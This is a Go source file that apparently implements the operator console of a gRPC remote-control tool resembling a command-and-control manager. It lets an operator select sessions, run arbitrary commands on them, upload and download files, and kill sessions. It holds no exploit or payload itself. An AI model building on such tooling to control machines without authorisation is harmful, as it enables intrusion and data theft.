package main

import (
	"bufio"
	"fmt"
	"os"
	pb "simpleGRPC/proto_defs"
	"strings"
)

func CommandHandling(client pb.AssetServiceClient, scanner *bufio.Scanner) {

	for {
		Ping(client)
		go GetNotified(client)

		fmt.Printf(cli, session)
		scanner.Scan()
		input := scanner.Text()
		parts := strings.Fields(input)
		if len(parts) == 0 {
			fmt.Println("Please enter a command.")
			continue
		}

		switch parts[0] {
		case "help":
			fmt.Println(PrintHelp())
		case "use":
			if len(parts) < 2 {
				fmt.Println(Red + "Error: Missing session ID." + Reset)
				continue
			}
			session = parts[1]
			fmt.Printf(Green+"Switched to session %s"+Reset+"\n", session)
		case "kill":
			if len(parts) == 2 && parts[1] == "all" {
				KillAll(client)
				continue
			}
			if session == "" {
				fmt.Println(Red + "Need to be inside a session to kill it." + Reset)
				continue
			}
			order := BuildOrder("exit", nil)
			session = ""
			rt := SendOrderFromManager(client, order)
			if rt != nil {
				continue
			}
		case "back":
			session = ""
		case "exec":
			if session == "" {
				fmt.Println(Red + "Error: No session selected. Use 'use <sessionId>' first." + Reset)
				continue
			}
			if len(parts) < 2 {
				fmt.Println(Red + "Error: Missing command to execute." + Reset)
				continue
			}
			command := strings.Join(parts[1:], " ")
			order := BuildOrder(command, nil)
			rt := SendOrderFromManager(client, order)
			if rt != nil {
				continue
			}

		case "sessions":
			if len(parts) == 2 && parts[1] == "alive" {
				GetAllSessions(client, true)
			} else {
				GetAllSessions(client, false)
			}
		case "history":
			if session == "" {
				fmt.Println(Red + "Error: use a session to get its history" + Reset)
				continue
			}
			fmt.Println(FetchSessionHistory(client, session))

		case "upload":
			if session == "" {
				fmt.Println(Red + "Error: use a session to get upload" + Reset)
				continue
			}
			if len(parts) != 3 {
				fmt.Println(Yellow + "Usage: upload file/to/upload destination/output/file/path" + Reset)
				continue
			}
			toupload, err := os.ReadFile(parts[1])
			if err != nil {
				fmt.Println(Yellow + "[-] Error reading file to upload" + Reset)
				continue
			}
			dest := parts[2]
			order := BuildOrder("upload "+dest, toupload)
			rt := SendOrderFromManager(client, order)
			if rt != nil {
				continue
			}

		case "download":
			if session == "" {
				fmt.Println(Red + "Error: use a session to get upload" + Reset)
				continue
			}
			if len(parts) != 2 {
				fmt.Println(Yellow + "Usage: download file/to/download" + Reset)
				continue
			}
			todownload := parts[1]
			order := BuildOrder("download "+todownload, nil)
			rt := SendOrderFromManager(client, order)
			if rt != nil {
				continue
			}

		case "exit":
			fmt.Println("Exiting Manager...")
			os.Exit(0)

		case "clear":
			fmt.Print(Clear)

		default:
			fmt.Println("Unknown command. Please try again.")
		}

	}
}
